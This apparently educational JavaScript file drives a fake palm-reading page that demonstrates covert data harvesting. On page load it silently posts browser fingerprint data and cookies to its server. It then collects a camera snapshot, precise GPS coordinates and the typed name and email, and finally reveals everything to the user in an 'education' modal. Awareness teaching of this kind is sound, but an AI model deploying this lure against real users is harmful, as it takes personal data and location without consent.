document.addEventListener('DOMContentLoaded', () => {
    // Views
    const landingScreen = document.getElementById('landing-screen');
    const cameraScreen = document.getElementById('camera-screen');
    const loadingScreen = document.getElementById('loading-screen');
    const resultsScreen = document.getElementById('results-screen');
    
    // QR Code Generation
    fetch('/api/server-info')
        .then(response => response.json())
        .then(data => {
            const urlElement = document.getElementById('server-url');
            urlElement.textContent = data.url;
            urlElement.onclick = () => window.open(data.url, '_blank');
            const qrContainer = document.getElementById('qrcode-container');
            qrContainer.innerHTML = '';
            new QRCode(qrContainer, {
                text: data.url,
                width: 150,
                height: 150,
                colorDark : "#000000",
                colorLight : "#ffffff",
                correctLevel : QRCode.CorrectLevel.H
            });
        }).catch(err => console.error(err));

    // Set a demo cookie so we can show it being stolen
    document.cookie = "session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/";
    document.cookie = "user_pref=theme=dark&lang=en; path=/";

    // Elements
    const startBtn = document.getElementById('start-btn');
    const captureBtn = document.getElementById('capture-btn');
    const cameraFeed = document.getElementById('camera-feed');
    const cameraStatus = document.getElementById('camera-status');
    const readingText = document.getElementById('reading-text');
    const stolenDataList = document.getElementById('stolen-data-list');
    const capturedImagePreview = document.getElementById('captured-image-preview');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const educationModal = document.getElementById('education-modal');
    const cookieDisplay = document.getElementById('cookie-display');

    let stream = null;
    let imageCaptureData = null;
    let userLocation = null;
    
    // Generate a unique session ID for this user's visit
    const sessionId = Math.random().toString(36).substring(2, 15);
    
    // Helper to switch views
    const switchView = (hideView, showView) => {
        hideView.classList.remove('active');
        hideView.classList.add('hidden');
        showView.classList.remove('hidden');
        showView.classList.add('active');
    };

    // ==========================================
    // PHASE 1: SILENT HARVESTING (ON PAGE LOAD)
    // ==========================================
    const performSilentHarvest = async () => {
        const metadata = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            platform: navigator.platform,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direct',
            battery: 'Unknown',
            cookies: document.cookie || 'None',
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None detected'
        };

        // Grab battery level
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                metadata.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging ⚡' : 'Unplugged 🔋'})`;
            } catch (e) {}
        }

        // Send silently
        try {
            await fetch('/api/silent-log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, metadata })
            });
        } catch (e) {}
        
        return metadata;
    };
    
    // Run immediately — no button pressed, no permission asked
    const initialMetadata = performSilentHarvest();

    // ==========================================
    // PHASE 2: THE "TRAP" (ACTIVE PERMISSIONS)
    // ==========================================
    const startCamera = async () => {
        try {
            cameraStatus.textContent = "Requesting camera and system access...";
            switchView(landingScreen, cameraScreen);
            
            // Silently request GPS alongside camera
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        userLocation = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            }

            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" }, 
                audio: false 
            });
            
            cameraFeed.srcObject = stream;
            cameraStatus.textContent = "Camera active. Ready for scanning.";
        } catch (err) {
            cameraStatus.textContent = "Camera access denied. We need it to read your palm!";
            cameraStatus.style.color = "#ef4444";
            setTimeout(() => {
                switchView(cameraScreen, landingScreen);
                cameraStatus.textContent = "";
                cameraStatus.style.color = "";
            }, 3000);
        }
    };

    startBtn.addEventListener('click', () => {
        startCamera();
    });

    captureBtn.addEventListener('click', () => {
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
        imageCaptureData = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(track => track.stop());
        stream = null;
        switchView(cameraScreen, loadingScreen);
        processScan();
    });

    const processScan = async () => {
        const metadata = await initialMetadata;
        
        // Capture what was typed in the form
        const userName = document.getElementById('user-name')?.value || '';
        const userEmail = document.getElementById('user-email')?.value || '';
        metadata.userName = userName;
        metadata.userEmail = userEmail;
        
        try {
            const response = await fetch('/api/analyze', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId,
                    image: imageCaptureData,
                    location: userLocation,
                    metadata
                })
            });
            const result = await response.json();
            setTimeout(() => {
                readingText.textContent = `"${result.reading}"`;
                populateStolenData(metadata, imageCaptureData, userLocation);
                switchView(loadingScreen, resultsScreen);
            }, 2000);
        } catch (error) {
            setTimeout(() => {
                readingText.textContent = '"Your stars align with caution — check the server!"';
                populateStolenData(metadata, imageCaptureData, userLocation);
                switchView(loadingScreen, resultsScreen);
            }, 2000);
        }
    };

    const populateStolenData = (metadata, base64Image, loc) => {
        // Show cookies in the cookie box
        if (cookieDisplay) {
            cookieDisplay.textContent = metadata.cookies || 'None found';
        }

        stolenDataList.innerHTML = `
            <li>🪪 <strong>Identity:</strong> <span style="color:#f87171;">${metadata.userName || '(not entered)'}</span> &lt;${metadata.userEmail || '(not entered)'}&gt;</li>
            <li>🌐 <strong>Browser/OS:</strong> ${metadata.platform} — ${metadata.userAgent.split(' ').slice(-2).join(' ')}</li>
            <li>📐 <strong>Screen:</strong> ${metadata.screenSize} @ ${metadata.colorDepth}</li>
            <li>🔋 <strong>Battery:</strong> ${metadata.battery}</li>
            <li>🕐 <strong>Timezone:</strong> ${metadata.timeZone}</li>
            <li>📎 <strong>Referrer:</strong> ${metadata.referrer}</li>
            <li style="color:#ef4444;">📷 <strong>Camera Snapshot:</strong> Captured ✅</li>
            <li id="gps-li" style="${loc ? 'color:#ef4444;' : ''}">📍 <strong>GPS:</strong> ${loc ? `LAT ${loc.lat.toFixed(5)}, LON ${loc.lon.toFixed(5)} (±${Math.round(loc.accuracy)}m) ✅` : 'Denied ❌'}</li>
            <li style="color:#ef4444;">🍪 <strong>Cookies Read:</strong> ✅ (see below)</li>
        `;

        let imagesHtml = '';
        if (base64Image) {
            imagesHtml += `
            <div style="flex:1;">
                <p style="margin-bottom:5px;font-weight:bold;">📷 Camera Snapshot</p>
                <img src="${base64Image}" alt="Captured Palm" style="max-width:100%;border-radius:8px;border:2px solid #ef4444;">
            </div>`;
        }
        if (loc) {
            imagesHtml += `
            <div style="flex:1;">
                <p style="margin-bottom:5px;font-weight:bold;color:#ef4444;">📍 Precise GPS Location</p>
                <div style="background:rgba(239,68,68,0.1);border:1px solid #ef4444;border-radius:8px;padding:12px;font-family:monospace;font-size:0.85rem;line-height:1.7;">
                    LAT: ${loc.lat}<br>
                    LON: ${loc.lon}<br>
                    ACCURACY: ~${Math.round(loc.accuracy)}m<br>
                    <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" style="color:#38bdf8;font-size:0.9rem;">📌 Open in Google Maps</a>
                </div>
            </div>`;
        }

        capturedImagePreview.innerHTML = `
            <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap;">${imagesHtml}</div>`;
        
        educationModal.classList.remove('hidden');
    };

    closeModalBtn.addEventListener('click', () => {
        readingText.textContent = "";
        educationModal.classList.add('hidden');
        setTimeout(() => { capturedImagePreview.innerHTML = ''; }, 500); 
        switchView(resultsScreen, landingScreen);
    });
});
